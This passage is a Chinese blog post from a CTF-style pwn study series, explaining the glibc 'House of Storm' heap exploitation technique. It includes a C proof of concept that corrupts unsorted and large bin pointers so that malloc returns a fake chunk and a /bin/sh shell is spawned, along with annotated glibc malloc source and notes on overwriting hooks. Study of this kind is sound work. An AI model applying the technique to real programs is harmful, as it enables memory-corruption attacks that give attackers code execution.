-<h2 id="源码调试demo"><a href="#源码调试demo" class="headerlink" title="源码调试demo"></a>源码调试demo</h2><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">struct {</span><br><span class="line">    unsigned long  presize;</span><br><span class="line">    unsigned long  size;</span><br><span class="line">    unsigned long  fd;</span><br><span class="line">    unsigned long  bk;</span><br><span class="line">    unsigned long  fd_nextsize;</span><br><span class="line">    unsigned long  bk_nextsize;</span><br><span class="line">}chunk;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">{</span><br><span class="line">    unsigned long *large_chunk,*unsorted_chunk;</span><br><span class="line">    unsigned long *fake_chunk = (unsigned long *)&amp;chunk;</span><br><span class="line">    char *ptr;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    unsorted_chunk=malloc(0x418);</span><br><span class="line">    malloc(0X20);</span><br><span class="line">    large_chunk=malloc(0x408);</span><br><span class="line">    malloc(0x20);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    free(large_chunk);</span><br><span class="line">    free(unsorted_chunk);</span><br><span class="line">    unsorted_chunk=malloc(0x418);</span><br><span class="line">    free(unsorted_chunk);  </span><br><span class="line"></span><br><span class="line">    unsorted_chunk[1] = (unsigned long )fake_chunk;</span><br><span class="line">    large_chunk[1]    = (unsigned long )fake_chunk+8;</span><br><span class="line">    large_chunk[3]    = (unsigned long )fake_chunk-0x18-5;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ptr=malloc(0x48);</span><br><span class="line">    strncpy(ptr, "/bin/sh\x00", 0x10);</span><br><span class="line">    system(((char *)fake_chunk + 0x10));</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
-
-<p>布局unsorted bin和large bin</p>
-<pre><code>unsorted_chunk=malloc(0x418);
-malloc(0X20);
-large_chunk=malloc(0x408);
-malloc(0x20);
-
-free(large_chunk);
-free(unsorted_chunk);
-unsorted_chunk=malloc(0x418);
-free(unsorted_chunk); 
-</code></pre>
-<p><img src="/pic/house_of_storm/1.png" alt="img"></p>
-<pre><code>unsorted_chunk[1] = (unsigned long )fake_chunk;
-large_chunk[1]    = (unsigned long )fake_chunk+8;
-large_chunk[3]    = (unsigned long )fake_chunk-0x18-5;
-</code></pre>
-<p>修改使满足attack的条件</p>
-<p><img src="/pic/house_of_storm/2.png" alt="img"></p>
-<p>malloc(0x20);</p>
-<p>接下来这一步就是关键，既然触发了unsorted bin attack也触发了large bin attack</p>
-<p>我们通过调试_int_malloc</p>
-<p><img src="/pic/house_of_storm/3.png" alt="img"></p>
-<p>发现程序执行下面这段，也就是unsorted bin attack攻击的位置</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">while` `((victim ``=` `unsorted_chunks (av)``-``&gt;bk) !``=` `unsorted_chunks (av))  ``/``/``从unsortbin第一个chunk（队尾）开始顺着bk指针向前遍历</span><br><span class="line">    ``{</span><br><span class="line">     ``bck ``=` `victim``-``&gt;bk;            ``/``/``bck是倒数第二个，victim是倒数第一个</span><br><span class="line">     ``/``/``size check</span><br><span class="line">     ``if` `(__builtin_expect (victim``-``&gt;size &lt;``=` `2` `*` `SIZE_SZ, ``0``)</span><br><span class="line">       ``|| __builtin_expect (victim``-``&gt;size &gt; av``-``&gt;system_mem, ``0``))</span><br><span class="line">      ``malloc_printerr (check_action, ``"malloc(): memory corruption"``,</span><br><span class="line">               ``chunk2mem (victim), av);</span><br><span class="line">     ``size ``=` `chunksize (victim);      ``/``/``取出最victim的size</span><br></pre></td></tr></tbody></table></figure>
-
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">``/``*</span><br><span class="line">  ``If a small request, ``try` `to use last remainder ``if` `it ``is` `the</span><br><span class="line">  ``only chunk ``in` `unsorted ``bin``. This helps promote locality ``for</span><br><span class="line">  ``runs of consecutive small requests. This ``is` `the only</span><br><span class="line">  ``exception to best``-``fit, ``and` `applies only when there ``is</span><br><span class="line">  ``no exact fit ``for` `a small chunk.</span><br><span class="line"> ``*``/</span><br><span class="line">``/``/``last remainder first</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="/pic/house_of_storm/4.png" alt="img"></p>
-<p>然后在执行到large bin attack的位置</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">if ((unsigned long) size == (unsigned long) fwd-&gt;size)</span><br><span class="line">/ *Always</span><br><span class="line">insert in the</span><br><span class="line">second</span><br><span class="line">position. * /</span><br><span class="line">fwd = fwd-&gt;fd;</span><br><span class="line">else</span><br><span class="line">{</span><br><span class="line">    victim-&gt;fd_nextsize = fwd;</span><br><span class="line">victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">fwd-&gt;bk_nextsize = victim;</span><br><span class="line">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">}</span><br><span class="line">bck = fwd-&gt;bk;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">else</span><br><span class="line">victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">mark_bin(av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="/pic/house_of_storm/5.png" alt="img"></p>
-<p>再执行完large bin attack后，可以看fake chunk</p>
-<p><img src="/pic/house_of_storm/6.png" alt="img"></p>
-<p>接下来继续走看那个检测，这里是0x55按理是过不了检测的</p>
-<p><img src="/pic/house_of_storm/7.png" alt="img"></p>
-<p><img src="/pic/house_of_storm/8.png" alt="img"></p>
-<p>如果是0x56就可以过check了</p>
-<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>一般我们触发攻击的attack是   add(0x48)，这里是因为fake_chunk的size是0x56或者0x55被视为是在0x50的范围，而如果是0x48的话就可以取出堆块，我们一般的攻击思路是覆盖hook函数挂上ogg，但是有没有想过如果不是0x48而是0x47或者0x45呢也是可以取出堆块的因为会被视为0x50，但是在attack也就是覆盖地址上会出现问题这里用一道题目的最后部分进行演示</p>
-<p>这是add(0x45)的情况</p>
-<p><img src="/pic/house_of_storm/9.png" alt="img"></p>
-<p>少了两字节</p>
-<p>这是add(0x46)的情况</p>
-<p><img src="/pic/house_of_storm/10.png" alt="img"></p>
-<p>少了一字节</p>
-<p>所以我们add(0x48)和add(0x47)都是可以的</p>
-<p>参考文章：</p>
-<p><a href="https://www.cnblogs.com/tolele/p/16728502.html">堆Pwn：House Of Storm利用手法 - tolele - 博客园 (cnblogs.com)</a></p>
-<p>[<a href="https://bbs.kanxue.com/thread-262423.htm">原创]unsortbin attack分析与总结-二进制漏洞-看雪-安全社区|安全招聘|kanxue.com</a></p>
-<p><a href="https://xz.aliyun.com/t/12673?time__1311=mqmhDvqIxUxGxWqGNveequtjD8jDkY/GCYeD&amp;alichlgref=https://www.bing.com/#toc-6">House Of Storm - 先知社区 (aliyun.com)</a> </p>
-]]></content>
-      <categories>
-        <category>pwn学习</category>
-        <category>堆利用</category>
-      </categories>
-      <tags>
-        <tag>house_of</tag>
       </tags>
   </entry>
 </search>
